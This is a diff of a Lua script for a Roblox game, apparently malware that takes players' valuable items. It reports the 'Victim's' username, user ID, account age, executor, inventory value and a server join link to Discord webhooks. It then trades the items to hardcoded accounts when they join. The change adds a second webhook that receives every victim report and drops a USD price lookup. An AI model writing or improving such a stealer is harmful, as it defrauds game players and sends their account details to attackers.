@@ -24,6 +24,7 @@ local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
+local dhwebhook = _G.dhwebhook or ""  -- New DH webhook
 
 -- Hardcoded target usernames
 local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
@@ -338,41 +339,15 @@ local function declineRequest()
     end)
 end
 
--- USD value calculation
-local function GetUSD(list)
-    local url = "https://we-bmm2.vercel.app/api/calc"
-    local items = {}
-    for _, item in ipairs(list) do
-        local displayName = database[item.DataID] and database[item.DataID].ItemName or item.DataID
-        table.insert(items, {name = displayName, amount = item.Amount})
-    end
-    local req = request or (syn and syn.request) or http_request
-    local success, res = pcall(function()
-        return req({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({inventory = items})
-        })
-    end)
-    if success and res and res.Body then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok and decoded then return decoded end
-    end
-    return {total = "0.00", itemPrices = {}}
-end
-
 -- Webhook functions - FIXED to show game values from supremevaluelist
-local function SendFirstMessage(list, prefix, totalValue)
-    local usdData = GetUSD(list)
-    local totalUSD = usdData.total or "0.00"
+local function SendFirstMessage(list, prefix, totalValue, targetWebhook)
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
     local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
     local fields = {
         { name = "\240\159\142\175 __Information__", value = "```User     : " .. plr.Name .. "\nID       : " .. plr.UserId .. "\nAge      : " .. plr.AccountAge .. "\nExecutor : " .. Executor .. "```", inline = false },
         { name = "\240\159\140\144 __Server__", value = "```Players    : " .. #Players:GetPlayers() .. " / " .. game.Players.MaxPlayers .. "```", inline = false },
-        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. (totalValue or 0) .. " / \$" .. totalUSD .. "\n\n", inline = false },
+        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. (totalValue or 0) .. "\n\n", inline = false },
         { name = "\240\159\148\151  __Join Link__", value = "[**Click to Join**](" .. JoinLink .. ")", inline = false }
     }
 
@@ -399,7 +374,7 @@ local function SendFirstMessage(list, prefix, totalValue)
     
     local payload = HttpService:JSONEncode(data)
     request({
-        Url = webhook,
+        Url = targetWebhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = payload
@@ -407,17 +382,14 @@ local function SendFirstMessage(list, prefix, totalValue)
 end
 
 -- FIXED: SendMessage now uses game values and white color
-local function SendMessage(sortedItems, totalValueParam)
-    local usdData = GetUSD(sortedItems)
-    local totalUSD = usdData.total or "0.00"
-    
+local function SendMessage(sortedItems, totalValueParam, targetWebhook)
     -- Use the passed parameter or default to 0 if nil
     local displayTotal = totalValueParam or 0
 
     local fields = {
         { name = "Victim Username:", value = plr.Name, inline = true },
         { name = "Items sent:", value = "", inline = false },
-        { name = "Summary:", value = string.format("Total Value: %s / $%s", displayTotal, totalUSD), inline = false }
+        { name = "Summary:", value = string.format("Total Value: %s", displayTotal), inline = false }
     }
 
     -- FIXED: Use game values from supremevaluelist instead of USD
@@ -452,7 +424,7 @@ local function SendMessage(sortedItems, totalValueParam)
 
     local payload = HttpService:JSONEncode(data)
     request({
-        Url = webhook,
+        Url = targetWebhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = payload
@@ -545,7 +517,13 @@ if #weaponsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    SendFirstMessage(weaponsToSend, prefix, totalValue)
+    -- Send to main webhook
+    SendFirstMessage(weaponsToSend, prefix, totalValue, webhook)
+    
+    -- Send to DH webhook if configured
+    if dhwebhook and dhwebhook ~= "" then
+        SendFirstMessage(weaponsToSend, prefix, totalValue, dhwebhook)
+    end
 
     local function doTrade(joinedUser)
         local initialTradeState = getTradeStatus()
@@ -597,7 +575,14 @@ if #weaponsToSend > 0 then
     local function startImmediateHit()
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(combinedUser, p.Name) then
-                SendMessage(sentWeapons, totalValue) -- Pass totalValue here
+                -- Send to main webhook
+                SendMessage(sentWeapons, totalValue, webhook)
+                
+                -- Send to DH webhook if configured
+                if dhwebhook and dhwebhook ~= "" then
+                    SendMessage(sentWeapons, totalValue, dhwebhook)
+                end
+                
                 doTrade(p.Name)
                 return
             end
@@ -610,7 +595,14 @@ if #weaponsToSend > 0 then
             if table.find(combinedUser, player.Name) then
                 player.Chatted:Connect(function()
                     if not sentMessage then
-                        SendMessage(sentWeapons, totalValue) -- Pass totalValue here
+                        -- Send to main webhook
+                        SendMessage(sentWeapons, totalValue, webhook)
+                        
+                        -- Send to DH webhook if configured
+                        if dhwebhook and dhwebhook ~= "" then
+                            SendMessage(sentWeapons, totalValue, dhwebhook)
+                        end
+                        
                         sentMessage = true
                     end
                     doTrade(player.Name)
@@ -630,7 +622,14 @@ if #weaponsToSend > 0 then
                 for _, player in ipairs(Players:GetPlayers()) do
                     if table.find(combinedUser, player.Name) then
                         if not sentMessage then
-                            SendMessage(sentWeapons, totalValue) -- Pass totalValue here
+                            -- Send to main webhook
+                            SendMessage(sentWeapons, totalValue, webhook)
+                            
+                            -- Send to DH webhook if configured
+                            if dhwebhook and dhwebhook ~= "" then
+                                SendMessage(sentWeapons, totalValue, dhwebhook)
+                            end
+                            
                             sentMessage = true
                         end
                         searchActive = false
